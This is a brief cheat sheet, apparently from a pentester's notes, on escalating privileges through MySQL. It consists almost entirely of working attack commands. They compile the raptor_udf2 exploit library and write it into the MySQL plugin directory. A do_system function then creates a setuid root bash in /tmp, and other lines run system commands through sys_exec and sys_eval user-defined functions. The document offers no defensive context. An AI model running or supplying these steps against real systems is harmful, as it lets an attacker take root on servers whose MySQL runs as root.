# Mysql

**MYSQL UDF Exploit**: [https://www.exploit-db.com/exploits/1518](https://www.exploit-db.com/exploits/1518)

```
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

mysql -u root

use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';

select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');

exit 

user@target$ /tmp/rootbash -p
```

**MYSQL running as root :**

```
mysql -u root

select sys_exec('whoami');
select sys_eval('whoami');

/* If function doesnt exist, create the function */
CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';

if NULL returns, try redirecting the errors
select sys_eval('ls /root 2>&1');
```
